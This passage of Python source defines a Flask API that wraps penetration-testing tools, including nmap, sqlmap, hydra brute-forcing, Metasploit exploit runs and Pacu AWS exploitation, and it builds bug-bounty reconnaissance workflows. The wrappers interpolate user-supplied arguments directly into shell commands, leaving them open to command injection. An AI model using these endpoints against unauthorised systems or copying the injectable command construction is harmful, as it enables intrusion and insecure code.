def execute_httpx_scan(target, params):
    """Execute httpx scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '-tech-detect -status-code')
        # Use shell command with pipe for httpx
        cmd = f"echo {target} | httpx {additional_args}"

        return execute_command(cmd)
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_wpscan_scan(target, params):
    """Execute wpscan scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '--enumerate p,t,u')
        cmd_parts = ['wpscan', '--url', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_dirsearch_scan(target, params):
    """Execute dirsearch scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['dirsearch', '-u', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_arjun_scan(target, params):
    """Execute arjun scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['arjun', '-u', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_paramspider_scan(target, params):
    """Execute paramspider scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['paramspider', '-d', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_dalfox_scan(target, params):
    """Execute dalfox scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['dalfox', 'url', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_amass_scan(target, params):
    """Execute amass scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['amass', 'enum', '-d', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_subfinder_scan(target, params):
    """Execute subfinder scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['subfinder', '-d', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.route("/api/intelligence/technology-detection", methods=["POST"])
def detect_technologies():
    """Detect technologies and create technology-specific testing recommendations"""
    try:
        data = request.get_json()
        if not data or 'target' not in data:
            return jsonify({"error": "Target is required"}), 400

        target = data['target']

        logger.info(f"🔍 Detecting technologies for {target}")

        # Analyze target
        profile = decision_engine.analyze_target(target)

        # Get technology-specific recommendations
        tech_recommendations = {}
        for tech in profile.technologies:
            if tech == TechnologyStack.WORDPRESS:
                tech_recommendations["WordPress"] = {
                    "tools": ["wpscan", "nuclei"],
                    "focus_areas": ["plugin vulnerabilities", "theme issues", "user enumeration"],
                    "priority": "high"
                }
            elif tech == TechnologyStack.PHP:
                tech_recommendations["PHP"] = {
                    "tools": ["nikto", "sqlmap", "ffuf"],
                    "focus_areas": ["code injection", "file inclusion", "SQL injection"],
                    "priority": "high"
                }
            elif tech == TechnologyStack.NODEJS:
                tech_recommendations["Node.js"] = {
                    "tools": ["nuclei", "ffuf"],
                    "focus_areas": ["prototype pollution", "dependency vulnerabilities"],
                    "priority": "medium"
                }

        logger.info(f"✅ Technology detection completed for {target}")

        return jsonify({
            "success": True,
            "target": target,
            "detected_technologies": [tech.value for tech in profile.technologies],
            "cms_type": profile.cms_type,
            "technology_recommendations": tech_recommendations,
            "target_profile": profile.to_dict(),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in technology detection: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# BUG BOUNTY HUNTING WORKFLOW API ENDPOINTS
# ============================================================================

@app.route("/api/bugbounty/reconnaissance-workflow", methods=["POST"])
def create_reconnaissance_workflow():
    """Create comprehensive reconnaissance workflow for bug bounty hunting"""
    try:
        data = request.get_json()
        if not data or 'domain' not in data:
            return jsonify({"error": "Domain is required"}), 400

        domain = data['domain']
        scope = data.get('scope', [])
        out_of_scope = data.get('out_of_scope', [])
        program_type = data.get('program_type', 'web')

        logger.info(f"🎯 Creating reconnaissance workflow for {domain}")

        # Create bug bounty target
        target = BugBountyTarget(
            domain=domain,
            scope=scope,
            out_of_scope=out_of_scope,
            program_type=program_type
        )

        # Generate reconnaissance workflow
        workflow = bugbounty_manager.create_reconnaissance_workflow(target)

        logger.info(f"✅ Reconnaissance workflow created for {domain}")

        return jsonify({
            "success": True,
            "workflow": workflow,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating reconnaissance workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/bugbounty/vulnerability-hunting-workflow", methods=["POST"])
def create_vulnerability_hunting_workflow():
    """Create vulnerability hunting workflow prioritized by impact"""
    try:
        data = request.get_json()
        if not data or 'domain' not in data:
            return jsonify({"error": "Domain is required"}), 400

        domain = data['domain']
        priority_vulns = data.get('priority_vulns', ["rce", "sqli", "xss", "idor", "ssrf"])
        bounty_range = data.get('bounty_range', 'unknown')

        logger.info(f"🎯 Creating vulnerability hunting workflow for {domain}")

        # Create bug bounty target
        target = BugBountyTarget(
            domain=domain,
            priority_vulns=priority_vulns,
            bounty_range=bounty_range
        )

        # Generate vulnerability hunting workflow
        workflow = bugbounty_manager.create_vulnerability_hunting_workflow(target)

        logger.info(f"✅ Vulnerability hunting workflow created for {domain}")

        return jsonify({
            "success": True,
            "workflow": workflow,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating vulnerability hunting workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/bugbounty/business-logic-workflow", methods=["POST"])
def create_business_logic_workflow():
    """Create business logic testing workflow"""
    try:
        data = request.get_json()
        if not data or 'domain' not in data:
            return jsonify({"error": "Domain is required"}), 400

        domain = data['domain']
        program_type = data.get('program_type', 'web')

        logger.info(f"🎯 Creating business logic testing workflow for {domain}")

        # Create bug bounty target
        target = BugBountyTarget(domain=domain, program_type=program_type)

        # Generate business logic testing workflow
        workflow = bugbounty_manager.create_business_logic_testing_workflow(target)

        logger.info(f"✅ Business logic testing workflow created for {domain}")

        return jsonify({
            "success": True,
            "workflow": workflow,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating business logic workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/bugbounty/osint-workflow", methods=["POST"])
def create_osint_workflow():
    """Create OSINT gathering workflow"""
    try:
        data = request.get_json()
        if not data or 'domain' not in data:
            return jsonify({"error": "Domain is required"}), 400

        domain = data['domain']

        logger.info(f"🎯 Creating OSINT workflow for {domain}")

        # Create bug bounty target
        target = BugBountyTarget(domain=domain)

        # Generate OSINT workflow
        workflow = bugbounty_manager.create_osint_workflow(target)

        logger.info(f"✅ OSINT workflow created for {domain}")

        return jsonify({
            "success": True,
            "workflow": workflow,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating OSINT workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/bugbounty/file-upload-testing", methods=["POST"])
def create_file_upload_testing():
    """Create file upload vulnerability testing workflow"""
    try:
        data = request.get_json()
        if not data or 'target_url' not in data:
            return jsonify({"error": "Target URL is required"}), 400

        target_url = data['target_url']

        logger.info(f"🎯 Creating file upload testing workflow for {target_url}")

        # Generate file upload testing workflow
        workflow = fileupload_framework.create_upload_testing_workflow(target_url)

        # Generate test files
        test_files = fileupload_framework.generate_test_files()
        workflow["test_files"] = test_files

        logger.info(f"✅ File upload testing workflow created for {target_url}")

        return jsonify({
            "success": True,
            "workflow": workflow,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating file upload testing workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/bugbounty/comprehensive-assessment", methods=["POST"])
def create_comprehensive_bugbounty_assessment():
    """Create comprehensive bug bounty assessment combining all workflows"""
    try:
        data = request.get_json()
        if not data or 'domain' not in data:
            return jsonify({"error": "Domain is required"}), 400

        domain = data['domain']
        scope = data.get('scope', [])
        priority_vulns = data.get('priority_vulns', ["rce", "sqli", "xss", "idor", "ssrf"])
        include_osint = data.get('include_osint', True)
        include_business_logic = data.get('include_business_logic', True)

        logger.info(f"🎯 Creating comprehensive bug bounty assessment for {domain}")

        # Create bug bounty target
        target = BugBountyTarget(
            domain=domain,
            scope=scope,
            priority_vulns=priority_vulns
        )

        # Generate all workflows
        assessment = {
            "target": domain,
            "reconnaissance": bugbounty_manager.create_reconnaissance_workflow(target),
            "vulnerability_hunting": bugbounty_manager.create_vulnerability_hunting_workflow(target)
        }

        if include_osint:
            assessment["osint"] = bugbounty_manager.create_osint_workflow(target)

        if include_business_logic:
            assessment["business_logic"] = bugbounty_manager.create_business_logic_testing_workflow(target)

        # Calculate total estimates
        total_time = sum(workflow.get("estimated_time", 0) for workflow in assessment.values() if isinstance(workflow, dict))
        total_tools = sum(workflow.get("tools_count", 0) for workflow in assessment.values() if isinstance(workflow, dict))

        assessment["summary"] = {
            "total_estimated_time": total_time,
            "total_tools": total_tools,
            "workflow_count": len([k for k in assessment.keys() if k != "target"]),
            "priority_score": assessment["vulnerability_hunting"].get("priority_score", 0)
        }

        logger.info(f"✅ Comprehensive bug bounty assessment created for {domain}")

        return jsonify({
            "success": True,
            "assessment": assessment,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating comprehensive assessment: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# SECURITY TOOLS API ENDPOINTS
# ============================================================================

@app.route("/api/tools/whois", methods=["POST"])
def whois():
    """
    WHOIS lookup tool endpoint.
    Expects JSON: { "target": "example.com" }
    """
    data = request.get_json(force=True)
    target = data.get("target", "")
    if not target:
        return jsonify({"error": "Missing 'target' parameter"}), 400

    try:
        result = subprocess.run(
            ["whois", target],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=30,
            text=True
        )
        output = result.stdout if result.returncode == 0 else result.stderr
        return jsonify({"success": result.returncode == 0, "output": output})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/tools/nmap", methods=["POST"])
def nmap():
    """Execute nmap scan with enhanced logging, caching, and intelligent error handling"""
    try:
        params = request.json
        target = params.get("target", "")
        scan_type = params.get("scan_type", "-sCV")
        ports = params.get("ports", "")
        additional_args = params.get("additional_args", "-T4 -Pn")
        use_recovery = params.get("use_recovery", True)

        if not target:
            logger.warning("🎯 Nmap called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"nmap {scan_type}"

        if ports:
            command += f" -p {ports}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {target}"

        logger.info(f"🔍 Starting Nmap scan: {target}")

        # Use intelligent error handling if enabled
        if use_recovery:
            tool_params = {
                "target": target,
                "scan_type": scan_type,
                "ports": ports,
                "additional_args": additional_args
            }
            result = execute_command_with_recovery("nmap", command, tool_params)
        else:
            result = execute_command(command)

        logger.info(f"📊 Nmap scan completed for {target}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in nmap endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/gobuster", methods=["POST"])
def gobuster():
    """Execute gobuster with enhanced logging and intelligent error handling"""
    try:
        params = request.json
        url = params.get("url", "")
        mode = params.get("mode", "dir")
        wordlist = params.get("wordlist", COMMON_DIRB_PATH)
        additional_args = params.get("additional_args", "")
        use_recovery = params.get("use_recovery", True)

        if not url:
            logger.warning("🌐 Gobuster called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        # Validate mode
        if mode not in ["dir", "dns", "fuzz", "vhost"]:
            logger.warning(f"❌ Invalid gobuster mode: {mode}")
            return jsonify({
                "error": f"Invalid mode: {mode}. Must be one of: dir, dns, fuzz, vhost"
            }), 400

        command = f"gobuster {mode} -u {url} -w {wordlist}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"📁 Starting Gobuster {mode} scan: {url}")

        # Use intelligent error handling if enabled
        if use_recovery:
            tool_params = {
                "target": url,
                "mode": mode,
                "wordlist": wordlist,
                "additional_args": additional_args
            }
            result = execute_command_with_recovery("gobuster", command, tool_params)
        else:
            result = execute_command(command)

        logger.info(f"📊 Gobuster scan completed for {url}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in gobuster endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/nuclei", methods=["POST"])
def nuclei():
    """Execute Nuclei vulnerability scanner with enhanced logging and intelligent error handling"""
    try:
        params = request.json
        target = params.get("target", "")
        severity = params.get("severity", "")
        tags = params.get("tags", "")
        template = params.get("template", "")
        additional_args = params.get("additional_args", "")
        use_recovery = params.get("use_recovery", True)

        if not target:
            logger.warning("🎯 Nuclei called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"nuclei -u {target}"

        if severity:
            command += f" -severity {severity}"

        if tags:
            command += f" -tags {tags}"

        if template:
            command += f" -t {template}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔬 Starting Nuclei vulnerability scan: {target}")

        # Use intelligent error handling if enabled
        if use_recovery:
            tool_params = {
                "target": target,
                "severity": severity,
                "tags": tags,
                "template": template,
                "additional_args": additional_args
            }
            result = execute_command_with_recovery("nuclei", command, tool_params)
        else:
            result = execute_command(command)

        logger.info(f"📊 Nuclei scan completed for {target}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in nuclei endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# CLOUD SECURITY TOOLS
# ============================================================================

@app.route("/api/tools/prowler", methods=["POST"])
def prowler():
    """Execute Prowler for AWS security assessment"""
    try:
        params = request.json
        provider = params.get("provider", "aws")
        profile = params.get("profile", "default")
        region = params.get("region", "")
        checks = params.get("checks", "")
        output_dir = params.get("output_dir", "/tmp/prowler_output")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        # Ensure output directory exists
        Path(output_dir).mkdir(parents=True, exist_ok=True)

        command = f"prowler {provider}"

        if profile:
            command += f" --profile {profile}"

        if region:
            command += f" --region {region}"

        if checks:
            command += f" --checks {checks}"

        command += f" --output-directory {output_dir}"
        command += f" --output-format {output_format}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"☁️  Starting Prowler {provider} security assessment")
        result = execute_command(command)
        result["output_directory"] = output_dir
        logger.info(f"📊 Prowler assessment completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in prowler endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/trivy", methods=["POST"])
def trivy():
    """Execute Trivy for container/filesystem vulnerability scanning"""
    try:
        params = request.json
        scan_type = params.get("scan_type", "image")  # image, fs, repo
        target = params.get("target", "")
        output_format = params.get("output_format", "json")
        severity = params.get("severity", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 Trivy called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"trivy {scan_type} {target}"

        if output_format:
            command += f" --format {output_format}"

        if severity:
            command += f" --severity {severity}"

        if output_file:
            command += f" --output {output_file}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Trivy {scan_type} scan: {target}")
        result = execute_command(command)
        if output_file:
            result["output_file"] = output_file
        logger.info(f"📊 Trivy scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in trivy endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ENHANCED CLOUD AND CONTAINER SECURITY TOOLS (v6.0)
# ============================================================================

@app.route("/api/tools/scout-suite", methods=["POST"])
def scout_suite():
    """Execute Scout Suite for multi-cloud security assessment"""
    try:
        params = request.json
        provider = params.get("provider", "aws")  # aws, azure, gcp, aliyun, oci
        profile = params.get("profile", "default")
        report_dir = params.get("report_dir", "/tmp/scout-suite")
        services = params.get("services", "")
        exceptions = params.get("exceptions", "")
        additional_args = params.get("additional_args", "")

        # Ensure report directory exists
        Path(report_dir).mkdir(parents=True, exist_ok=True)

        command = f"scout {provider}"

        if profile and provider == "aws":
            command += f" --profile {profile}"

        if services:
            command += f" --services {services}"

        if exceptions:
            command += f" --exceptions {exceptions}"

        command += f" --report-dir {report_dir}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"☁️  Starting Scout Suite {provider} assessment")
        result = execute_command(command)
        result["report_directory"] = report_dir
        logger.info(f"📊 Scout Suite assessment completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in scout-suite endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/cloudmapper", methods=["POST"])
def cloudmapper():
    """Execute CloudMapper for AWS network visualization and security analysis"""
    try:
        params = request.json
        action = params.get("action", "collect")  # collect, prepare, webserver, find_admins, etc.
        account = params.get("account", "")
        config = params.get("config", "config.json")
        additional_args = params.get("additional_args", "")

        if not account and action != "webserver":
            logger.warning("☁️  CloudMapper called without account parameter")
            return jsonify({"error": "Account parameter is required for most actions"}), 400

        command = f"cloudmapper {action}"

        if account:
            command += f" --account {account}"

        if config:
            command += f" --config {config}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"☁️  Starting CloudMapper {action}")
        result = execute_command(command)
        logger.info(f"📊 CloudMapper {action} completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in cloudmapper endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/pacu", methods=["POST"])
def pacu():
    """Execute Pacu for AWS exploitation framework"""
    try:
        params = request.json
        session_name = params.get("session_name", "hexstrike_session")
        modules = params.get("modules", "")
        data_services = params.get("data_services", "")
        regions = params.get("regions", "")
        additional_args = params.get("additional_args", "")

        # Create Pacu command sequence
        commands = []
        commands.append(f"set_session {session_name}")

        if data_services:
            commands.append(f"data {data_services}")

        if regions:
            commands.append(f"set_regions {regions}")

        if modules:
            for module in modules.split(","):
                commands.append(f"run {module.strip()}")

        commands.append("exit")

        # Create command file
        command_file = "/tmp/pacu_commands.txt"
        with open(command_file, "w") as f:
            f.write("\n".join(commands))

        command = f"pacu < {command_file}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"☁️  Starting Pacu AWS exploitation")
        result = execute_command(command)

        # Cleanup
        try:
            os.remove(command_file)
        except:
            pass

        logger.info(f"📊 Pacu exploitation completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in pacu endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/kube-hunter", methods=["POST"])
def kube_hunter():
    """Execute kube-hunter for Kubernetes penetration testing"""
    try:
        params = request.json
        target = params.get("target", "")
        remote = params.get("remote", "")
        cidr = params.get("cidr", "")
        interface = params.get("interface", "")
        active = params.get("active", False)
        report = params.get("report", "json")
        additional_args = params.get("additional_args", "")

        command = "kube-hunter"

        if target:
            command += f" --remote {target}"
        elif remote:
            command += f" --remote {remote}"
        elif cidr:
            command += f" --cidr {cidr}"
        elif interface:
            command += f" --interface {interface}"
        else:
            # Default to pod scanning
            command += " --pod"

        if active:
            command += " --active"

        if report:
            command += f" --report {report}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"☁️  Starting kube-hunter Kubernetes scan")
        result = execute_command(command)
        logger.info(f"📊 kube-hunter scan completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in kube-hunter endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/kube-bench", methods=["POST"])
def kube_bench():
    """Execute kube-bench for CIS Kubernetes benchmark checks"""
    try:
        params = request.json
        targets = params.get("targets", "")  # master, node, etcd, policies
        version = params.get("version", "")
        config_dir = params.get("config_dir", "")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        command = "kube-bench"

        if targets:
            command += f" --targets {targets}"

        if version:
            command += f" --version {version}"

        if config_dir:
            command += f" --config-dir {config_dir}"

        if output_format:
            command += f" --outputfile /tmp/kube-bench-results.{output_format} --json"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"☁️  Starting kube-bench CIS benchmark")
        result = execute_command(command)
        logger.info(f"📊 kube-bench benchmark completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in kube-bench endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/docker-bench-security", methods=["POST"])
def docker_bench_security():
    """Execute Docker Bench for Security for Docker security assessment"""
    try:
        params = request.json
        checks = params.get("checks", "")  # Specific checks to run
        exclude = params.get("exclude", "")  # Checks to exclude
        output_file = params.get("output_file", "/tmp/docker-bench-results.json")
        additional_args = params.get("additional_args", "")

        command = "docker-bench-security"

        if checks:
            command += f" -c {checks}"

        if exclude:
            command += f" -e {exclude}"

        if output_file:
            command += f" -l {output_file}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🐳 Starting Docker Bench Security assessment")
        result = execute_command(command)
        result["output_file"] = output_file
        logger.info(f"📊 Docker Bench Security completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in docker-bench-security endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/clair", methods=["POST"])
def clair():
    """Execute Clair for container vulnerability analysis"""
    try:
        params = request.json
        image = params.get("image", "")
        config = params.get("config", "/etc/clair/config.yaml")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        if not image:
            logger.warning("🐳 Clair called without image parameter")
            return jsonify({"error": "Image parameter is required"}), 400

        # Use clairctl for scanning
        command = f"clairctl analyze {image}"

        if config:
            command += f" --config {config}"

        if output_format:
            command += f" --format {output_format}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🐳 Starting Clair vulnerability scan: {image}")
        result = execute_command(command)
        logger.info(f"📊 Clair scan completed for {image}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in clair endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/falco", methods=["POST"])
def falco():
    """Execute Falco for runtime security monitoring"""
    try:
        params = request.json
        config_file = params.get("config_file", "/etc/falco/falco.yaml")
        rules_file = params.get("rules_file", "")
        output_format = params.get("output_format", "json")
        duration = params.get("duration", 60)  # seconds
        additional_args = params.get("additional_args", "")

        command = f"timeout {duration} falco"

        if config_file:
            command += f" --config {config_file}"

        if rules_file:
            command += f" --rules {rules_file}"

        if output_format == "json":
            command += " --json"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🛡️  Starting Falco runtime monitoring for {duration}s")
        result = execute_command(command)
        logger.info(f"📊 Falco monitoring completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in falco endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/checkov", methods=["POST"])
def checkov():
    """Execute Checkov for infrastructure as code security scanning"""
    try:
        params = request.json
        directory = params.get("directory", ".")
        framework = params.get("framework", "")  # terraform, cloudformation, kubernetes, etc.
        check = params.get("check", "")
        skip_check = params.get("skip_check", "")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        command = f"checkov -d {directory}"

        if framework:
            command += f" --framework {framework}"

        if check:
            command += f" --check {check}"

        if skip_check:
            command += f" --skip-check {skip_check}"

        if output_format:
            command += f" --output {output_format}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Checkov IaC scan: {directory}")
        result = execute_command(command)
        logger.info(f"📊 Checkov scan completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in checkov endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/terrascan", methods=["POST"])
def terrascan():
    """Execute Terrascan for infrastructure as code security scanning"""
    try:
        params = request.json
        scan_type = params.get("scan_type", "all")  # all, terraform, k8s, etc.
        iac_dir = params.get("iac_dir", ".")
        policy_type = params.get("policy_type", "")
        output_format = params.get("output_format", "json")
        severity = params.get("severity", "")
        additional_args = params.get("additional_args", "")

        command = f"terrascan scan -t {scan_type} -d {iac_dir}"

        if policy_type:
            command += f" -p {policy_type}"

        if output_format:
            command += f" -o {output_format}"

        if severity:
            command += f" --severity {severity}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Terrascan IaC scan: {iac_dir}")
        result = execute_command(command)
        logger.info(f"📊 Terrascan scan completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in terrascan endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/dirb", methods=["POST"])
def dirb():
    """Execute dirb with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", COMMON_DIRB_PATH)
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Dirb called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"dirb {url} {wordlist}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"📁 Starting Dirb scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Dirb scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in dirb endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/nikto", methods=["POST"])
def nikto():
    """Execute nikto with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 Nikto called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"nikto -h {target}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔬 Starting Nikto scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 Nikto scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in nikto endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/sqlmap", methods=["POST"])
def sqlmap():
    """Execute sqlmap with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        data = params.get("data", "")
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🎯 SQLMap called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"sqlmap -u {url} --batch"

        if data:
            command += f" --data=\"{data}\""

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"💉 Starting SQLMap scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 SQLMap scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in sqlmap endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/metasploit", methods=["POST"])
def metasploit():
    """Execute metasploit module with enhanced logging"""
    try:
        params = request.json
        module = params.get("module", "")
        options = params.get("options", {})

        if not module:
            logger.warning("🚀 Metasploit called without module parameter")
            return jsonify({
                "error": "Module parameter is required"
            }), 400

        # Create an MSF resource script
        resource_content = f"use {module}\n"
        for key, value in options.items():
            resource_content += f"set {key} {value}\n"
        resource_content += "exploit\n"

        # Save resource script to a temporary file
        resource_file = "/tmp/mcp_msf_resource.rc"
        with open(resource_file, "w") as f:
            f.write(resource_content)

        command = f"msfconsole -q -r {resource_file}"

        logger.info(f"🚀 Starting Metasploit module: {module}")
        result = execute_command(command)

        # Clean up the temporary file
        try:
            os.remove(resource_file)
        except Exception as e:
            logger.warning(f"Error removing temporary resource file: {str(e)}")

        logger.info(f"📊 Metasploit module completed: {module}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in metasploit endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/hydra", methods=["POST"])
def hydra():
    """Execute hydra with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        service = params.get("service", "")
        username = params.get("username", "")
        username_file = params.get("username_file", "")
        password = params.get("password", "")
        password_file = params.get("password_file", "")
        additional_args = params.get("additional_args", "")

        if not target or not service:
            logger.warning("🎯 Hydra called without target or service parameter")
            return jsonify({
                "error": "Target and service parameters are required"
            }), 400

        if not (username or username_file) or not (password or password_file):
            logger.warning("🔑 Hydra called without username/password parameters")
            return jsonify({
                "error": "Username/username_file and password/password_file are required"
            }), 400

        command = f"hydra -t 4"

        if username:
            command += f" -l {username}"
        elif username_file:
            command += f" -L {username_file}"

        if password:
            command += f" -p {password}"
        elif password_file:
            command += f" -P {password_file}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {target} {service}"

        logger.info(f"🔑 Starting Hydra attack: {target}:{service}")
        result = execute_command(command)
        logger.info(f"📊 Hydra attack completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in hydra endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/john", methods=["POST"])
def john():
    """Execute john with enhanced logging"""
    try:
